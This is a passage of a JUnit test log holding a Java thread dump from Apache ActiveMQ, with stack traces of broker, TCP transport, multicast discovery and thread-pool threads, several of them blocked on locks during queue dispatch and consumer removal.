    [junit]     at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:107)
    [junit]     at org.apache.activemq.broker.AbstractConnection.processRemoveConsumer(AbstractConnection.java:431)
    [junit]     at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:63)
    [junit]     at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:190)
    [junit]     at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
    [junit]     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
    [junit]     at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:75)
    [junit]     at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
    [junit]     - locked <0x1c8d0a80> (a java.lang.Object)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteConsumerAdvisory(DemandForwardingBridge.java:331)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteCommand(DemandForwardingBridge.java:235)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge$2.onCommand(DemandForwardingBridge.java:121)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
    [junit]     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
    [junit]     at org.apache.activemq.transport.failover.FailoverTransport$1.onCommand(FailoverTransport.java:103)
    [junit]     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
    [junit]     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp://localhost/127.0.0.1:53747"" prio=5 tid=0x005390f0 nid=0x1913c00 in Object.wait() [0xf1b26000..0xf1b26ad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c8629b8> (a edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch)
    [junit]     at java.lang.Object.wait(Object.java:474)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch.await(CountDownLatch.java:173)
    [junit]     - locked <0x1c8629b8> (a edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge.waitStarted(DemandForwardingBridge.java:481)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteCommand(DemandForwardingBridge.java:250)
    [junit]     - locked <0x1c862a40> (a java.lang.Object)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge$2.onCommand(DemandForwardingBridge.java:121)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
    [junit]     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
    [junit]     at org.apache.activemq.transport.failover.FailoverTransport$1.onCommand(FailoverTransport.java:103)
    [junit]     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
    [junit]     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp:///127.0.0.1:53755"" daemon prio=9 tid=0x00538e90 nid=0x1912800 runnable [0xf22b5000..0xf22b5ad0]
    [junit]     at java.net.SocketInputStream.socketRead0(Native Method)
    [junit]     at java.net.SocketInputStream.read(SocketInputStream.java:129)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
    [junit]     at java.io.DataInputStream.readInt(DataInputStream.java:353)
    [junit]     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp://localhost/127.0.0.1:53749"" prio=5 tid=0x00538a00 nid=0x1912400 in Object.wait() [0xf2234000..0xf2234ad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c862b60> (a edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch)
    [junit]     at java.lang.Object.wait(Object.java:474)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch.await(CountDownLatch.java:173)
    [junit]     - locked <0x1c862b60> (a edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge.waitStarted(DemandForwardingBridge.java:481)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteCommand(DemandForwardingBridge.java:250)
    [junit]     - locked <0x1c862be8> (a java.lang.Object)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge$2.onCommand(DemandForwardingBridge.java:121)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
    [junit]     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
    [junit]     at org.apache.activemq.transport.failover.FailoverTransport$1.onCommand(FailoverTransport.java:103)
    [junit]     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
    [junit]     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp:///127.0.0.1:53754"" daemon prio=9 tid=0x005383d0 nid=0x1850e00 runnable [0xf20b1000..0xf20b1ad0]
    [junit]     at java.net.SocketInputStream.socketRead0(Native Method)
    [junit]     at java.net.SocketInputStream.read(SocketInputStream.java:129)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
    [junit]     at java.io.DataInputStream.readInt(DataInputStream.java:353)
    [junit]     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp:///127.0.0.1:53753"" daemon prio=9 tid=0x005362f0 nid=0x182a200 runnable [0xf1f2e000..0xf1f2ead0]
    [junit]     at java.net.SocketInputStream.socketRead0(Native Method)
    [junit]     at java.net.SocketInputStream.read(SocketInputStream.java:129)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
    [junit]     at java.io.DataInputStream.readInt(DataInputStream.java:353)
    [junit]     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp://localhost/127.0.0.1:53745"" prio=5 tid=0x00537340 nid=0x1916400 waiting for monitor entry [0xf21b2000..0xf21b3ad0]
    [junit]     at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:58)
    [junit]     - waiting to lock <0x1c8c9340> (a org.apache.activemq.broker.region.QueueSubscription)
    [junit]     at org.apache.activemq.broker.region.QueueSubscription.add(QueueSubscription.java:38)
    [junit]     at org.apache.activemq.broker.region.policy.RoundRobinDispatchPolicy.dispatch(RoundRobinDispatchPolicy.java:53)
    [junit]     - locked <0x1c926f28> (a edu.emory.mathcs.backport.java.util.concurrent.CopyOnWriteArrayList)
    [junit]     at org.apache.activemq.broker.region.Queue.removeSubscription(Queue.java:210)
    [junit]     - locked <0x1c926760> (a java.util.LinkedList)
    [junit]     at org.apache.activemq.broker.region.AbstractRegion.removeConsumer(AbstractRegion.java:179)
    [junit]     at org.apache.activemq.broker.region.RegionBroker.removeConsumer(RegionBroker.java:280)
    [junit]     at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:95)
    [junit]     at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:164)
    [junit]     at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:95)
    [junit]     at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:107)
    [junit]     at org.apache.activemq.broker.AbstractConnection.processRemoveConsumer(AbstractConnection.java:431)
    [junit]     at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:63)
    [junit]     at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:190)
    [junit]     at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
    [junit]     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
    [junit]     at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:75)
    [junit]     at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
    [junit]     - locked <0x1c80aac8> (a java.lang.Object)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteConsumerAdvisory(DemandForwardingBridge.java:331)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteCommand(DemandForwardingBridge.java:235)
    [junit]     at org.apache.activemq.network.DemandForwardingBridge$2.onCommand(DemandForwardingBridge.java:121)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
    [junit]     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
    [junit]     at org.apache.activemq.transport.failover.FailoverTransport$1.onCommand(FailoverTransport.java:103)
    [junit]     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
    [junit]     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp://localhost/127.0.0.1:53745"" prio=5 tid=0x00536f80 nid=0x1843c00 runnable [0xf2132000..0xf2132ad0]
    [junit]     at java.net.SocketInputStream.socketRead0(Native Method)
    [junit]     at java.net.SocketInputStream.read(SocketInputStream.java:129)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
    [junit]     at java.io.DataInputStream.readInt(DataInputStream.java:353)
    [junit]     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp:///127.0.0.1:53752"" daemon prio=9 tid=0x00533fe0 nid=0x190ec00 runnable [0xf1ca9000..0xf1ca9ad0]
    [junit]     at java.net.SocketInputStream.socketRead0(Native Method)
    [junit]     at java.net.SocketInputStream.read(SocketInputStream.java:129)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
    [junit]     at java.io.DataInputStream.readInt(DataInputStream.java:353)
    [junit]     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""ActiveMQ Default Thread Pool Thread"" daemon prio=5 tid=0x00536450 nid=0x182b600 in Object.wait() [0xf1faf000..0xf1fafad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c4a8840> (a java.lang.Object)
    [junit]     at java.lang.Object.wait(Object.java:474)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:152)
    [junit]     - locked <0x1c4a8840> (a java.lang.Object)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""Transport Status Dector org.apache.activemq.broker.TransportConnector@dc0dd8"" daemon prio=9 tid=0x00534f90 nid=0x18b8c00 waiting on condition [0xf18a1000..0xf18a1ad0]
    [junit]     at java.lang.Thread.sleep(Native Method)
    [junit]     at org.apache.activemq.broker.TransportStatusDetector.run(TransportStatusDetector.java:98)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp:///127.0.0.1:53751"" daemon prio=9 tid=0x00536050 nid=0x1828e00 in Object.wait() [0xf1eac000..0xf1eadad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c926f00> (a java.lang.Object)
    [junit]     at java.lang.Object.wait(Object.java:474)
    [junit]     at org.apache.activemq.thread.Valve.increment(Valve.java:88)
    [junit]     - locked <0x1c926f00> (a java.lang.Object)
    [junit]     at org.apache.activemq.broker.region.Queue.dispatch(Queue.java:364)
    [junit]     at org.apache.activemq.broker.region.Queue.send(Queue.java:245)
    [junit]     at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:195)
    [junit]     at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:309)
    [junit]     at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)
    [junit]     at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:107)
    [junit]     at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)
    [junit]     at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:119)
    [junit]     at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:337)
    [junit]     at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:508)
    [junit]     at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:190)
    [junit]     at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
    [junit]     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
    [junit]     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
    [junit]     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp://localhost/127.0.0.1:53749"" prio=5 tid=0x00535aa0 nid=0x190d800 runnable [0xf1e2c000..0xf1e2cad0]
    [junit]     at java.net.SocketInputStream.socketRead0(Native Method)
    [junit]     at java.net.SocketInputStream.read(SocketInputStream.java:129)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
    [junit]     at java.io.DataInputStream.readInt(DataInputStream.java:353)
    [junit]     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp://localhost/127.0.0.1:53749"" prio=5 tid=0x00535600 nid=0x190d400 runnable [0xf1dab000..0xf1dabad0]
    [junit]     at java.net.SocketInputStream.socketRead0(Native Method)
    [junit]     at java.net.SocketInputStream.read(SocketInputStream.java:129)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
    [junit]     at java.io.DataInputStream.readInt(DataInputStream.java:353)
    [junit]     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""MulticastDiscovery: null"" daemon prio=5 tid=0x00535360 nid=0x190f000 runnable [0xf1d2a000..0xf1d2aad0]
    [junit]     at java.net.PlainDatagramSocketImpl.receive0(Native Method)
    [junit]     at java.net.PlainDatagramSocketImpl.receive(PlainDatagramSocketImpl.java:136)
    [junit]     - locked <0x1c6d2ef0> (a java.net.PlainDatagramSocketImpl)
    [junit]     at java.net.DatagramSocket.receive(DatagramSocket.java:712)
    [junit]     - locked <0x1c6dff50> (a java.net.DatagramPacket)
    [junit]     - locked <0x1c6d0800> (a java.net.MulticastSocket)
    [junit]     at org.apache.activemq.transport.discovery.multicast.MulticastDiscoveryAgent.run(MulticastDiscoveryAgent.java:239)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp:///127.0.0.1:53750"" daemon prio=9 tid=0x00534cf0 nid=0x1851600 in Object.wait() [0xf1c27000..0xf1c28ad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c926f00> (a java.lang.Object)
    [junit]     at java.lang.Object.wait(Object.java:474)
    [junit]     at org.apache.activemq.thread.Valve.increment(Valve.java:88)
    [junit]     - locked <0x1c926f00> (a java.lang.Object)
    [junit]     at org.apache.activemq.broker.region.Queue.dispatch(Queue.java:364)
    [junit]     at org.apache.activemq.broker.region.Queue.send(Queue.java:245)
    [junit]     at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:195)
    [junit]     at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:309)
    [junit]     at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)
    [junit]     at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:107)
    [junit]     at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)
    [junit]     at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:119)
    [junit]     at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:337)
    [junit]     at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:508)
    [junit]     at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:190)
    [junit]     at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
    [junit]     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
    [junit]     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
    [junit]     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
    [junit]     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""ActiveMQ Default Thread Pool Thread"" daemon prio=5 tid=0x00534280 nid=0x1851200 in Object.wait() [0xf1ba7000..0xf1ba7ad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c4a8840> (a java.lang.Object)
    [junit]     at java.lang.Object.wait(Object.java:474)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:152)
    [junit]     - locked <0x1c4a8840> (a java.lang.Object)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""ActiveMQ Default Thread Pool Thread"" daemon prio=5 tid=0x00533d40 nid=0x1850a00 in Object.wait() [0xf1aa5000..0xf1aa5ad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c4a8840> (a java.lang.Object)
    [junit]     at java.lang.Object.wait(Object.java:474)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:152)
    [junit]     - locked <0x1c4a8840> (a java.lang.Object)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""Transport Status Dector org.apache.activemq.broker.TransportConnector@c47680"" daemon prio=9 tid=0x005337f0 nid=0x1850600 waiting on condition [0xf1a24000..0xf1a24ad0]
    [junit]     at java.lang.Thread.sleep(Native Method)
    [junit]     at org.apache.activemq.broker.TransportStatusDetector.run(TransportStatusDetector.java:98)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""MulticastDiscovery: tcp://bigmac-6.local:53749"" daemon prio=5 tid=0x00533380 nid=0x1850200 runnable [0xf19a3000..0xf19a3ad0]
    [junit]     at java.net.PlainDatagramSocketImpl.receive0(Native Method)
    [junit]     at java.net.PlainDatagramSocketImpl.receive(PlainDatagramSocketImpl.java:136)
    [junit]     - locked <0x1c64c530> (a java.net.PlainDatagramSocketImpl)
    [junit]     at java.net.DatagramSocket.receive(DatagramSocket.java:712)
    [junit]     - locked <0x1c64c570> (a java.net.DatagramPacket)
    [junit]     - locked <0x1c64c590> (a java.net.MulticastSocket)
    [junit]     at org.apache.activemq.transport.discovery.multicast.MulticastDiscoveryAgent.run(MulticastDiscoveryAgent.java:239)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""TcpTransportServer@tcp://bigmac-6.local:53749"" daemon prio=9 tid=0x00532f90 nid=0x1851a00 runnable [0xf1922000..0xf1922ad0]
    [junit]     at java.net.PlainSocketImpl.socketAccept(Native Method)
    [junit]     at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:384)
    [junit]     - locked <0x1c6d1928> (a java.net.SocksSocketImpl)
    [junit]     at java.net.ServerSocket.implAccept(ServerSocket.java:450)
    [junit]     at java.net.ServerSocket.accept(ServerSocket.java:421)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransportServer.run(TcpTransportServer.java:96)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""ActiveMQ Scheduler"" daemon prio=5 tid=0x00532a00 nid=0x18b8800 in Object.wait() [0xf1820000..0xf1820ad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c3d6210> (a java.lang.Object)
    [junit]     at java.lang.Object.wait(Object.java:432)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.TimeUnit.timedWait(TimeUnit.java:294)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:156)
    [junit]     - locked <0x1c3d6210> (a java.lang.Object)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp://localhost/127.0.0.1:53747"" prio=5 tid=0x00530620 nid=0x18b9600 runnable [0xf179f000..0xf179fad0]
    [junit]     at java.net.SocketInputStream.socketRead0(Native Method)
    [junit]     at java.net.SocketInputStream.read(SocketInputStream.java:129)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
    [junit]     at java.io.DataInputStream.readInt(DataInputStream.java:353)
    [junit]     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""tcp:///127.0.0.1:53748"" daemon prio=9 tid=0x00530250 nid=0x18b9200 runnable [0xf171e000..0xf171ead0]
    [junit]     at java.net.SocketInputStream.socketRead0(Native Method)
    [junit]     at java.net.SocketInputStream.read(SocketInputStream.java:129)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
    [junit]     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
    [junit]     at java.io.DataInputStream.readInt(DataInputStream.java:353)
    [junit]     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""Transport Status Dector org.apache.activemq.broker.TransportConnector@d03b5b"" daemon prio=9 tid=0x0052ff30 nid=0x18b8400 waiting on condition [0xf169d000..0xf169dad0]
    [junit]     at java.lang.Thread.sleep(Native Method)
    [junit]     at org.apache.activemq.broker.TransportStatusDetector.run(TransportStatusDetector.java:98)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""ActiveMQ Default Thread Pool Thread"" daemon prio=5 tid=0x0052f8e0 nid=0x18c6e00 in Object.wait() [0xf161c000..0xf161cad0]
    [junit]     at java.lang.Object.wait(Native Method)
    [junit]     - waiting on <0x1c4a8840> (a java.lang.Object)
    [junit]     at java.lang.Object.wait(Object.java:474)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:152)
    [junit]     - locked <0x1c4a8840> (a java.lang.Object)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)
    [junit]     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""MulticastDiscovery: null"" daemon prio=5 tid=0x0052f640 nid=0x18c6a00 runnable [0xf159b000..0xf159bad0]
    [junit]     at java.net.PlainDatagramSocketImpl.receive0(Native Method)
    [junit]     at java.net.PlainDatagramSocketImpl.receive(PlainDatagramSocketImpl.java:136)
    [junit]     - locked <0x1c517f78> (a java.net.PlainDatagramSocketImpl)
    [junit]     at java.net.DatagramSocket.receive(DatagramSocket.java:712)
    [junit]     - locked <0x1c59c280> (a java.net.DatagramPacket)
    [junit]     - locked <0x1c517fb8> (a java.net.MulticastSocket)
    [junit]     at org.apache.activemq.transport.discovery.multicast.MulticastDiscoveryAgent.run(MulticastDiscoveryAgent.java:239)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""Transport Status Dector org.apache.activemq.broker.TransportConnector@215748"" daemon prio=9 tid=0x0052f1c0 nid=0x18c6600 waiting on condition [0xf151a000..0xf151aad0]
    [junit]     at java.lang.Thread.sleep(Native Method)
    [junit]     at org.apache.activemq.broker.TransportStatusDetector.run(TransportStatusDetector.java:98)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""MulticastDiscovery: tcp://bigmac-6.local:53747"" daemon prio=5 tid=0x0052edf0 nid=0x18b9e00 runnable [0xf1499000..0xf1499ad0]
    [junit]     at java.net.PlainDatagramSocketImpl.receive0(Native Method)
    [junit]     at java.net.PlainDatagramSocketImpl.receive(PlainDatagramSocketImpl.java:136)
    [junit]     - locked <0x1c51a138> (a java.net.PlainDatagramSocketImpl)
    [junit]     at java.net.DatagramSocket.receive(DatagramSocket.java:712)
    [junit]     - locked <0x1c51a178> (a java.net.DatagramPacket)
    [junit]     - locked <0x1c51a198> (a java.net.MulticastSocket)
    [junit]     at org.apache.activemq.transport.discovery.multicast.MulticastDiscoveryAgent.run(MulticastDiscoveryAgent.java:239)
    [junit]     at java.lang.Thread.run(Thread.java:613)
    [junit] 
    [junit] ""TcpTransportServer@tcp://bigmac-6.local:53747"" daemon prio=9 tid=0x0052e9b0 nid=0x18b9a00 runnable [0xf1418000..0xf1418ad0]
    [junit]     at java.net.PlainSocketImpl.socketAccept(Native Method)
    [junit]     at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:384)
    [junit]     - locked <0x1c51a288> (a java.net.SocksSocketImpl)
    [junit]     at java.net.ServerSocket.implAccept(ServerSocket.java:450)
    [junit]     at java.net.ServerSocket.accept(ServerSocket.java:421)
    [junit]     at org.apache.activemq.transport.tcp.TcpTransportServer.run(TcpTransportServer.java:96)
